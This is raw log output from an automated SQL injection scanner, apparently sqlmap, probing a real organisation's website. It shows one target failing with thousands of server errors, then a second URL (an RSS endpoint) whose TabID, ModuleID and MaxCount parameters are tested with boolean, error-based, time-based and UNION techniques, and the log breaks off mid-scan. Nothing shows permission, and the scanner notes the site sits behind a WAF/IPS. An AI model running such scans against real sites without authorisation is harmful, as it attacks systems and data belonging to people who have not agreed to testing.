[06:42:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[06:42:31] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[06:42:31] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[06:42:33] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[06:42:56] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[06:43:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[06:43:45] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[06:44:08] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[06:44:09] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[06:44:10] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[06:44:11] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[06:44:19] [INFO] testing 'PostgreSQL inline queries'
[06:44:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[06:44:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[06:45:08] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[06:45:23] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[06:45:48] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[06:46:02] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[06:46:35] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[06:47:22] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[06:47:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[06:48:23] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[06:48:54] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[06:49:57] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[06:50:29] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[06:50:51] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[06:51:20] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[06:51:20] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[06:51:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[06:51:22] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[06:51:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[06:52:27] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[06:53:37] [WARNING] GET parameter 'q' does not seem to be injectable
[06:53:37] [INFO] testing if parameter 'User-Agent' is dynamic
[06:53:38] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[06:53:38] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[06:53:39] [INFO] testing for SQL injection on parameter 'User-Agent'
[06:53:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:54:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[06:55:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[06:55:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:56:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:57:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[06:57:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[06:57:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[06:57:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:57:46] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[06:57:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[06:57:47] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[06:57:48] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[06:57:49] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[06:58:12] [INFO] testing 'Generic inline queries'
[06:58:12] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[06:58:39] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[06:59:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[06:59:44] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[06:59:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[06:59:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[06:59:46] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[06:59:47] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[06:59:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[06:59:50] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[07:00:05] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[07:00:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:01:30] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[07:02:00] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[07:02:01] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[07:02:01] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[07:02:02] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[07:02:03] [INFO] testing 'PostgreSQL inline queries'
[07:02:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:02:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[07:02:49] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[07:03:04] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[07:03:34] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[07:03:50] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[07:04:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:05:15] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[07:06:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[07:06:30] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[07:06:59] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[07:07:38] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[07:08:07] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[07:08:45] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[07:09:20] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[07:09:20] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[07:09:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[07:09:23] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[07:09:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:10:17] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[07:11:38] [WARNING] parameter 'User-Agent' does not seem to be injectable
[07:11:38] [INFO] testing if parameter 'Referer' is dynamic
[07:11:39] [WARNING] parameter 'Referer' does not appear to be dynamic
[07:11:39] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[07:11:40] [INFO] testing for SQL injection on parameter 'Referer'
[07:11:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:12:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[07:13:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[07:13:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[07:14:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[07:14:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[07:15:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[07:15:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[07:15:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:15:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[07:15:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[07:15:36] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[07:15:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[07:15:38] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[07:16:15] [INFO] testing 'Generic inline queries'
[07:16:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[07:16:48] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[07:17:36] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[07:17:37] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[07:17:37] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[07:17:38] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[07:17:38] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[07:17:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[07:17:41] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[07:17:43] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[07:18:06] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[07:18:21] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:19:02] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[07:19:33] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[07:19:33] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[07:19:34] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[07:19:35] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[07:19:36] [INFO] testing 'PostgreSQL inline queries'
[07:19:37] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:19:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[07:20:16] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[07:20:40] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[07:21:20] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[07:21:34] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[07:22:06] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:22:37] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[07:23:14] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[07:23:59] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[07:24:28] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[07:25:23] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[07:25:53] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[07:26:13] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[07:26:35] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[07:26:35] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[07:26:36] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[07:26:37] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[07:26:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:27:37] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[07:28:37] [WARNING] parameter 'Referer' does not seem to be injectable
[07:28:37] [INFO] testing if parameter 'Host' is dynamic
[07:28:37] [WARNING] parameter 'Host' does not appear to be dynamic
[07:28:37] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[07:28:38] [INFO] testing for SQL injection on parameter 'Host'
[07:28:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:29:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[07:30:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[07:31:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[07:32:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[07:32:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[07:32:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[07:33:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[07:33:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:33:18] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[07:33:19] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[07:33:20] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[07:33:20] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[07:33:21] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[07:34:21] [INFO] testing 'Generic inline queries'
[07:34:21] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[07:35:02] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[07:35:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[07:35:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[07:35:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[07:35:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[07:35:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[07:35:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[07:35:56] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[07:36:05] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[07:36:35] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[07:37:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:37:22] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[07:37:56] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[07:37:56] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[07:37:56] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[07:37:57] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[07:37:58] [INFO] testing 'PostgreSQL inline queries'
[07:37:58] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:38:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[07:38:43] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[07:39:11] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[07:39:31] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[07:39:46] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[07:40:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:40:46] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[07:41:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[07:41:19] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[07:41:38] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[07:42:25] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[07:42:47] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[07:42:59] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[07:43:09] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[07:43:09] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[07:43:10] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[07:43:18] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[07:43:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:43:38] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[07:43:58] [WARNING] parameter 'Host' does not seem to be injectable
[07:43:58] [ERROR] all tested parameters do not appear to be injectable, skipping to the next target
[07:43:58] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 18 times, 500 (Internal Server Error) - 3206 times, 400 (Bad Request) - 1550 times
[2/5] URL:
GET https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/Rss.aspx?TabID=17222&ModuleID=23961&MaxCount=25
do you want to test this URL? [Y/n/q]
>

[07:43:58] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/DnnForge - NewsArticles/Rss.aspx?TabID=17222&ModuleID=23961&MaxCount=25'
you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=mMZ6SZjv2AE...1NTg4YzAy0'). Do you want to use those [Y/n]

[07:44:00] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[07:44:00] [INFO] testing if the target URL content is stable
[07:44:01] [INFO] target URL content is stable
[07:44:01] [INFO] testing if GET parameter 'TabID' is dynamic
got a 302 redirect to 'https://www.mustso.org.tr/'. Do you want to follow? [Y/n]

[07:44:03] [INFO] GET parameter 'TabID' appears to be dynamic
[07:44:06] [INFO] heuristic (basic) test shows that GET parameter 'TabID' might be injectable
[07:44:08] [INFO] testing for SQL injection on GET parameter 'TabID'
[07:44:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:45:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[07:46:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[07:48:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[07:48:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[07:49:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[07:49:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[07:50:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[07:50:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:50:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[07:50:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[07:50:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[07:50:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[07:50:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[07:51:41] [INFO] testing 'Generic inline queries'
[07:51:41] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[07:52:49] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[07:53:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[07:53:36] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[07:53:36] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[07:53:37] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[07:53:38] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[07:53:41] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[07:53:41] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[07:53:43] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[07:54:25] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[07:55:02] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:55:47] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[07:56:08] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[07:56:15] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[07:56:16] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[07:56:17] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[07:56:18] [INFO] testing 'PostgreSQL inline queries'
[07:56:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:56:18] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[07:56:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[07:57:00] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[07:57:14] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[07:57:42] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[07:58:10] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[07:58:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:59:20] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[07:59:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[08:00:20] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[08:00:45] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[08:01:27] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[08:02:02] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[08:02:19] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[08:02:46] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[08:02:46] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[08:02:47] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[08:02:48] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]

[08:02:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:03:10] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[08:03:31] [WARNING] GET parameter 'TabID' does not seem to be injectable
[08:03:31] [WARNING] GET parameter 'ModuleID' does not appear to be dynamic
[08:03:31] [WARNING] heuristic (basic) test shows that GET parameter 'ModuleID' might not be injectable
[08:03:32] [INFO] testing for SQL injection on GET parameter 'ModuleID'
[08:03:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:04:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[08:05:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[08:06:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:07:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:08:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[08:08:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[08:08:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[08:08:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:08:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[08:08:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[08:08:35] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[08:08:36] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[08:08:36] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[08:09:07] [INFO] testing 'Generic inline queries'
[08:09:07] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[08:09:53] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[08:10:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[08:10:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[08:10:45] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[08:10:46] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[08:10:46] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[08:10:47] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[08:10:47] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[08:10:49] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[08:11:27] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[08:11:56] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:12:25] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[08:12:46] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[08:12:46] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[08:12:47] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[08:12:47] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[08:12:48] [INFO] testing 'PostgreSQL inline queries'
[08:12:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:12:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[08:13:29] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[08:13:36] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[08:13:57] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[08:14:12] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[08:14:47] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[08:15:12] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[08:15:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[08:16:02] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[08:16:28] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[08:16:53] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[08:17:50] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[08:18:15] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[08:18:26] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[08:18:27] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[08:18:27] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[08:18:27] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[08:18:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:18:56] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[08:19:07] [WARNING] GET parameter 'ModuleID' does not seem to be injectable
[08:19:07] [WARNING] GET parameter 'MaxCount' does not appear to be dynamic
[08:19:16] [WARNING] heuristic (basic) test shows that GET parameter 'MaxCount' might not be injectable
[08:19:17] [INFO] testing for SQL injection on GET parameter 'MaxCount'
[08:19:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:20:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[08:22:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[08:23:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:24:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:25:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[08:25:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[08:25:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[08:25:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:25:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[08:25:58] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[08:25:58] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[08:25:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[08:25:59] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[08:26:54] [INFO] testing 'Generic inline queries'
[08:26:55] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[08:27:55] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[08:28:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
